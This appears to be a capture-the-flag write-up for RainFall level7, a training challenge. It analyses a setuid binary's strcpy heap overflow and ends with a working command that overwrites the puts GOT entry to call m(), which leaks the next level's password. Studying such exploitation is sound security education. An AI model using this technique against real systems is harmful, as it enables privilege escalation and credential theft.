# RainFall (level7)

In this project, we try to **exploit binaries** with the intent of reading the `/home/users/level<n+1>/.pass` file, containing our flag serving as the password for the next level.

# Binary

Binary properties:
- Full path: `/home/user/level7/level7`
- Type: **ELF 32-bit LSB executable** (`file -b ~/level7`)

To analyze its content we generated two files:
- [source.c](./source.c): generated with our [ghidra.sh](../common/ghidra/ghidra.sh), wrapping a [Ghidra](https://github.com/nationalsecurityagency/ghidra)-based [docker container](https://hub.docker.com/r/blacktop/ghidra).
- [source.asm](./source.asm): trimmed after being generated through `objdump -D ~/level7`.

# Security

Let's connect to the server through [ssh](./Ressources/ssh.sh) and inspect the protections in place.

## File Attributes

```sh
$ ls -la ~/level7
-rwsr-s---+ 1 level8 users 5648 Mar  9  2016 /home/user/level7/level7
```

These describe the binary's privileges.
|    Attribute    |   State   |                           Meaning for us                           |
|       ---       |    ---    |                                ---                                 |
|    Suid bit     |    ✅     | Runs with level8's effective id: opening a shell inherits it.


## Compile-Time

```sh
$ checksec --file ~/level7
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level7/level7
```

These are the protections baked directly into the binary.
|   Protection    |   State   |                           Meaning for us                           |
|       ---       |    ---    |                                ---                                 |
|      RELRO      |    ❌     | GOT is writable.
|  Stack Canary   |    ❌     | Stack buffer overflows are possible.
|       NX        |    ❌     | Stack/Heap are nonexecutable. Shellcode injection is possible.
|       PIE       |    ❌     | The stack's position is predictable.
| RPATH / RUNPATH |    ❌     | No custom library search path to hijack.

## Kernel Run-Time

```sh
$ cat /proc/sys/kernel/randomize_va_space
0
```

These are the protections baked directly into the binary.
|   Protection    |   State   |                           Meaning for us                           |
|       ---       |    ---    |                                ---                                 |
|      ASLR       |    ❌     | Stack and heap addresses are stable across runs.

## Documentation

Reference material for the concepts above:
- Setuid flag (Suid): https://fr.wikipedia.org/wiki/Setuid
- Relocation Read-Only (RELRO): https://ctf101.org/binary-exploitation/relocation-read-only/
- Stack canary: https://ctf101.org/binary-exploitation/stack-canaries/
- No eXecute (NX): https://ctf101.org/binary-exploitation/no-execute/
- Position Independent Code (PIE): https://en.wikipedia.org/wiki/Position-independent_code
- RUNPATH & RPATH: https://en.wikipedia.org/wiki/Rpath
- Address Space Layout Randomization (ASLR): https://ctf101.org/binary-exploitation/address-space-layout-randomization/

## Discovered vulnerability

The decompiled binary (cf. [source](source.c)) is subject to a "Use of Potentially Dangerous Function" ([CWE-676](https://cwe.mitre.org/data/definitions/676.html)). Not all [`strcpy()` man page](https://man7.org/linux/man-pages/man3/strcpy.3.html)s do explicitly state it as dangerous. This one describes it as cause of undefined behaviour.

`strcpy()` does not perform a buffer overrun check. It introduces a **stack/heap-overflow** opportunity when handling user-controlled input. In parallel, the kernel and binary do not implement modern security practices *(No-eXecute bit)* that would make it harder to exploit.

## Vulnerability analysis

Our binary is compiled for a **32-bit x86** system.  
It contains two user-defined functions (`main()`, `m()`).  
Although `m()` is never called in normal execution, calling it prints the contents of the global stack variable `c`, in which the first 68 bytes of the contents of `fopen("/home/user/level8/.pass", "r")` are stored, exposing the password for **user8**.

The binary core logic works based on the **heap**.

### Stack

After the `puts("~~")` call, the stack frames would ressemble something like this.
```ruby
      HIGHER MEMORY ADDRESSES     
+--------------------------------+
|      main's return address     | (4 bytes)
+--------------------------------+ <--- main's Stack Frame start (@ 0xbffff73c)
|   caller's stack base pointer  | (4 bytes)
+--------------------------------+ <--- main's local variables start (EBP: @ 0xbffff738)
| |               |              |
| |  unused/align | (8 bytes)    |
| |               |              |
| +---------------+              |
| |   cntr_a PTR  | (4 bytes)    |
| +---------------+ (@ bffff72c) |
| |   cntr_b PTR  | (4 bytes)    |(40 bytes)
| +---------------+ (@ bffff728) |
| |               |              |
| |  unused/align | (12 bytes)   |
| |               |              |
| +---------------+              |
| |   stream PTR  | (4 bytes)    |
| +---------------+ (@ bffff718) |
| |     arg#2     | (4 bytes)    |
| +---------------+              |
| |     arg#1     | (4 bytes)    |
+--------------------------------+ <-- main's Stack Pointer (ESP: @ 0xbffff710)
      LOWER MEMORY ADDRESSES      
```

### Heap

Four `malloc(8)` calls are made, returning 4 pointers on the heap. These are concidently contiguous due to requested memory sizes.

We can collect the addresses returned by `malloc()` via dynamic analysis via [gdb](https://www.sourceware.org/gdb/).
```sh
$ gdb -batch \
      -ex "tbreak *0x08048536" \
      -ex "tbreak *0x08048550" \
      -ex "tbreak *0x08048565" \
      -ex "tbreak *0x0804857f" \
      -ex "run" \
      -ex "printf \"malloc returned: %p\n\", \$eax" \
      -ex "continue" \
      -ex "printf \"malloc returned: %p\n\", \$eax" \
      -ex "continue" \
      -ex "printf \"malloc returned: %p\n\", \$eax" \
      -ex "continue" \
      -ex "printf \"malloc returned: %p\n\", \$eax" \
      --args ./level7 x x
Temporary breakpoint 1 at 0x8048536
Temporary breakpoint 2 at 0x8048550
Temporary breakpoint 3 at 0x8048565
Temporary breakpoint 4 at 0x804857f

Temporary breakpoint 1, 0x08048536 in main ()
malloc returned: 0x804a008

Temporary breakpoint 2, 0x08048550 in main ()
malloc returned: 0x804a018

Temporary breakpoint 3, 0x08048565 in main ()
malloc returned: 0x804a028

Temporary breakpoint 4, 0x0804857f in main ()
malloc returned: 0x804a038
```

The heap's structure would ressemble something like and be a total of 64 contiguous bytes.
```ruby
      LOWER MEMORY ADDRESSES      
+------ Chunk nº1: metadata -----+
|                                | (8 bytes)
+------ Chunk nº1: userdata -----+ <-- (@ 0x0804a008) PTR held on **stack** by `cntr_a`
| id: 1                          | (4 bytes)
| str: 0x0804a018                | (4 bytes)
+------ Chunk nº2: metadata -----+
|                                | (8 bytes)
+------ Chunk nº2: userdata -----+ <-- (@ 0x0804a018) PTR held on **heap** by `cntr_a->str`
|                                | (8 bytes)
+------ Chunk nº3: metadata -----+
|                                | (8 bytes)
+------ Chunk nº3: userdata -----+ <-- (@ 0x0804a028) PTR held on **stack** by `cntr_b`
| id: 2                          | (4 bytes)
| str: 0x0804a038                | (4 bytes)
+------ Chunk nº4: metadata -----+
|                                | (8 bytes)
+------ Chunk nº4: userdata -----+ <-- (@ 0x0804a038) PTR held on **heap** by `cntr_b->str`
|                                | (8 bytes)
+--------------------------------+
      HIGHER MEMORY ADDRESSES     
```

### GOTS

As stated by the `puts@plt` function (cf. [source.asm](./source.asm)), `puts()`'s [GOT](https://ctf101.org/binary-exploitation/what-is-the-got/) entry:
- In **big-endian hex** notation, is located at: `0x08049928`.
- In **little-endian hex** escape sequence, is located at: `\x28\x99\x04\x08`.
- In **little-endian oct** escape sequence, is located at: `\050\231\004\010`.
```sh
08048400 <puts@plt>:
 8048400:	ff 25 28 99 04 08    	jmp    *0x08049928
 8048406:	68 28 00 00 00       	push   $0x28
 804840b:	e9 90 ff ff ff       	jmp    80483a0 <_init+0x34>
```

### Intent

We perform two sequential `strcpy()` calls targeting pointers inside a 64 byte heap memory layout.  
The first call writes to the address held by `cntr_a->str`.  
The second call writes to the address held by `cntr_b->str`.  
Because `cntr_a->str` preceeds `cntr_b->str` in memory, we can overflow and alter the pointer stored in `cntr_b->str`, allowing us to write to any address.

By doing that, we wish the modify the `puts` [GOT](https://ctf101.org/binary-exploitation/what-is-the-got/) entry and make it point to the `m()` *(0x080484f4)* function instead. The `m()` would expose the content of the global buffer `c`.

## Exploit

`m()`:
- In **big-endian hex** notation, is located at: `0x080484f4`.
- In **little-endian hex** escape sequence, is located at: `\xf4\x84\x04\x08`.
- In **little-endian oct** escape sequence, is located at: `\364\204\004\010`.

```sh
# (0x0804a028 + 0x4) − 0x0804a018 = 0x14 (20 in decimal) 
$ ./level7 "$(printf "%20c%b" "c" "\050\231\004\010")" "$(printf "%b" "\364\204\004\010")"
```